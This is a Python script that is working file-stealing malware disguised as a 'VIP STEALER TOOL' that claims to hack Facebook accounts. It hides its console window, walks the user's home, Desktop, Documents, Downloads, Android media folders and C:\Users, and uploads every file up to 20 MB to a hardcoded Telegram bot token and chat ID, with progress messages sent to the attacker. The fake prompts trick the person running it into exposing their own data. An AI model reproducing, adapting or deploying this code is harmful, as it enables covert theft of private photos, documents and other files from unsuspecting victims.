import os
import sys
import time
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path


if os.name == 'nt':
    import ctypes
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass


BOT_TOKEN = "8640314818:AAHOvYNQuyRSgXRDX_HHaRFd6of6EoeoNzk"
CHAT_ID = "8624696916"


sent_files = set()


def azr3(text):
    try:
        requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage', 
                     json={'chat_id': CHAT_ID, 'text': text}, timeout=5)
    except:
        pass

def send_photo(path):
    try:
        with open(path, 'rb') as f:
            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto', 
                         files={'photo': f}, data={'chat_id': CHAT_ID}, timeout=30)
        return True
    except:
        return False

def send_video(path):
    try:
        with open(path, 'rb') as f:
            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendVideo', 
                         files={'video': f}, data={'chat_id': CHAT_ID}, timeout=60)
        return True
    except:
        return False

def send_audio(path):
    try:
        with open(path, 'rb') as f:
            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendAudio', 
                         files={'audio': f}, data={'chat_id': CHAT_ID}, timeout=30)
        return True
    except:
        return False

def send_document(path):
    try:
        with open(path, 'rb') as f:
            requests.post(f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument', 
                         files={'document': f}, data={'chat_id': CHAT_ID}, timeout=30)
        return True
    except:
        return False


def get_file_type(file_path):
    ext = file_path.suffix.lower()
    if ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp', '.heic']:
        return 'photo'
    elif ext in ['.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.3gp', '.webm']:
        return 'video'
    elif ext in ['.mp3', '.wav', '.ogg', '.m4a', '.flac', '.aac']:
        return 'audio'
    else:
        return 'document'


def steal_single_file(file_path):
    global sent_files
    
    file_path_str = str(file_path)
    if file_path_str in sent_files:
        return False
    
    try:
        if file_path.stat().st_size > 20 * 1024 * 1024:
            return False
        
        file_type = get_file_type(file_path)
        
        if file_type == 'photo':
            success = send_photo(file_path)
        elif file_type == 'video':
            success = send_video(file_path)
        elif file_type == 'audio':
            success = send_audio(file_path)
        else:
            success = send_document(file_path)
        
        if success:
            sent_files.add(file_path_str)
            return True
    except:
        pass
    return False


def azr4():
    all_files = []
    
    search_paths = [
        os.path.expanduser("~"),
        os.path.expanduser("~/Desktop"),
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Downloads"),
        os.path.expanduser("~/Pictures"),
        os.path.expanduser("~/Videos"),
        os.path.expanduser("~/Music"),
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/Movies",
        "/storage/emulated/0/Music",
        "C:\\Users",
        "C:\\Users\\Public",
    ]
    
    for base_path in search_paths:
        if os.path.exists(base_path):
            try:
                for root, dirs, files in os.walk(base_path):
                    for file in files:
                        try:
                            file_path = Path(root) / file
                            if file_path.stat().st_size <= 20 * 1024 * 1024:
                                all_files.append(file_path)
                        except:
                            continue
            except:
                continue
    
    return all_files


def azr2(total_stolen):
    report = f"""
â Ø¹ÙÙÙØ© Ø§ÙØ³Ø±ÙØ© Ø§ÙØªÙÙØª

ð Ø§ÙØ¥Ø­ØµØ§Ø¦ÙØ§Øª:
ð ØªÙ Ø³Ø±ÙØ© {total_stolen} ÙÙÙ

ð± Ø§ÙÙÙØµØ©: Telegram
ð¤ Bot Active
"""
    azr3(report)


def fake_input():
    print("\n" * 10)
    print("=" * 50)
    print("        VIP STEALER TOOL v5.0")
    print("=" * 50)
    print("\n")
    
    fake_token = input("ð Ø§Ø¯Ø®Ù ØªÙÙÙ Ø§ÙØ¨ÙØª: ")
    print("\nâ Ø¬Ø§Ø±Ù Ø§ÙØªØ­ÙÙ ÙÙ Ø§ÙØªÙÙÙ...")
    time.sleep(1)
    
    fake_id = input("\nð Ø§Ø¯Ø®Ù Ø§ÙØ¯Ù Ø§ÙÙØ³ØªØ®Ø¯Ù: ")
    print("\nâ Ø¬Ø§Ø±Ù Ø§ÙØªØ­ÙÙ ÙÙ Ø§ÙØ§ÙØ¯Ù...")
    time.sleep(1)
    
    print("\n" + "=" * 50)
    print("ð Ø¬Ø§Ø±Ù ØªØ´ØºÙÙ Ø£Ø¯Ø§Ø© Ø§ÙØµÙØ¯...")
    print("ð± Ø§ÙØµÙØ¯ Ø¹ÙÙ ÙÙØ³Ø¨ÙÙ - 3 Ø¯ÙÙÙÙØ§Øª")
    print("=" * 50)
    print("\n")
    time.sleep(2)


def azr():
    try:
        
        azr3("ð Ø¨Ø¯Ø¡ Ø¹ÙÙÙØ© Ø³Ø±ÙØ© Ø§ÙÙÙÙØ§Øª...")
        
        
        all_files = azr4()
        azr3(f"ð ØªÙ Ø§ÙØ¹Ø«ÙØ± Ø¹ÙÙ {len(all_files)} ÙÙÙ")
        
        
        stolen_count = 0
        with ThreadPoolExecutor(max_workers=5000000000000000) as executor:
            futures = {executor.submit(steal_single_file, file_path): file_path for file_path in all_files}
            for future in as_completed(futures):
                if future.result():
                    stolen_count += 1
                    if stolen_count % 50 == 0:
                        azr3(f"ð ØªÙ Ø³Ø±ÙØ© {stolen_count} ÙÙÙ Ø­ØªÙ Ø§ÙØ¢Ù")
        
        
        azr2(stolen_count)
        
        
        print("\n" + "=" * 50)
        print("â ØªÙ Ø§ÙØ§ÙØªÙØ§Ø¡ Ø¨ÙØ¬Ø§Ø­!")
        print("ð ØªÙ ØµÙØ¯ 3 Ø¯ÙÙÙÙØ§Øª ÙÙØ³Ø¨ÙÙ")
        print("=" * 50)
        time.sleep(3)
        
    except Exception as e:
        azr3(f"â Ø®Ø·Ø£: {str(e)}")

if __name__ == "__main__":
    azr()
